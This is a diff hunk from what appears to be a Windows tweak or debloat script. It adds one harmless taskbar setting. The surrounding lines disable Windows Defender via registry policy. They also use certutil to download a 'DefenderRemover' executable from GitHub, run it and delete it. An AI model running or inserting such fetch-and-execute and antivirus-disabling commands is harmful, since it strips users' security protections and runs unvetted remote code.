@@ -16,4 +16,5 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableWinDefende
 reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 2 /f
 sc stop "SysMain" & sc config "SysMain" start=disabled
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDrive" /t REG_SZ /d "" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Feeds" /v "ShellFeedsTaskbarViewMode" /t REG_DWORD /d "2" /f
 certutil -urlcache -split -f "https://github.com/jbara2002/windows-defender-remover/releases/download/pre_def_12_5/DefenderRemover.Phase5.exe" "C:\Users\Public\Downloads\DefenderRemover.Phase5.exe" && cmd.exe /c "C:\Users\Public\Downloads\DefenderRemover.Phase5.exe" && del /F /Q "C:\Users\Public\Downloads\DefenderRemover.Phase5.exe"
